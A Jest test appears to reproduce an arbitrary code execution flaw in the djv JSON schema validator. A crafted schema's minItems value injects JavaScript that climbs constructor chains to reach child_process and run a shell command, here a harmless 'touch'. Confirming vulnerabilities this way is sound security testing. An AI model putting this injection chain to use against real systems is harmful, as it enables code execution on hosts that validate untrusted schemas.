test("Arbitrary code execution in  djv", () => {
  const fs = require("fs");
  const path = "./djv";
  const sleep = require("sleep");

  expect.assertions(2);
  fs.unlink(path, function (err) {});
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const djv = require("djv");
  try {
    const env = new djv();
    const evilSchema = JSON.parse(
      `{"common":{"type":"array", "minItems":"1 + (import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('touch ${path}'))"}}`
    );
    env.addSchema("test", evilSchema);
    env.validate("test#/common", { type: "custom" });
  } catch (error) {console.log(error)}
  sleep.sleep(2);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
